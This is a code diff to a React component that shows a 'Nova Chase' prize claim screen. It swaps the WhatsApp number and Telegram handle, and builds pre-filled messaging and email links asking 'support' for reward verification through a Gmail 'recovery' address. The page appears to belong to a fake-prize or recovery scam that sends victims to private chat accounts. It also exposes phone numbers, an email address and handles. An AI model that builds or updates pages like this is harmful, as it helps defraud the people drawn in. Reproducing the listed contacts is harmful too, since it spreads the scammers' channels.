@@ -5,9 +5,8 @@ import type { Prize } from "@/lib/prizes";
 import { makeReference } from "@/lib/prizes";
 import { Particles } from "./Particles";
 
-const WHATSAPP_NUMBER = "972552491867";
 const SUPPORT_EMAIL = "novachaserecovery@gmail.com";
-const TELEGRAM_HANDLE = "Tatiana_POPOV12";
+const TELEGRAM_HANDLE = "MiriamalonCEO";
 
 function useCopy(timeout = 2000) {
   const [copied, setCopied] = useState(false);
@@ -33,8 +32,8 @@ export function ClaimScreen({ prize, onRestart }: { prize: Prize; onRestart: () 
 
   const verificationMessage = `Hello Nova Chase support,\n\nI would like to request promotional verification for my reward.\n\nPrize: ${prize.name}\nReference: ${reference}\nDate: ${stamp}\n\nPlease assist me with the next steps.`;
 
-  const waLink = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(verificationMessage)}`;
-  const telegramLink = `https://telegram.me/${TELEGRAM_HANDLE}`;
+  const waLink = `https://wa.me/12498955991?text=${encodeURIComponent(verificationMessage)}`;
+  const telegramLink = `https://t.me/${TELEGRAM_HANDLE}`;
   const mailtoLink = `mailto:${SUPPORT_EMAIL}?subject=${encodeURIComponent(`Nova Chase Reward Verification — ${reference}`)}&body=${encodeURIComponent(verificationMessage)}`;
 
   const refCopy = useCopy();
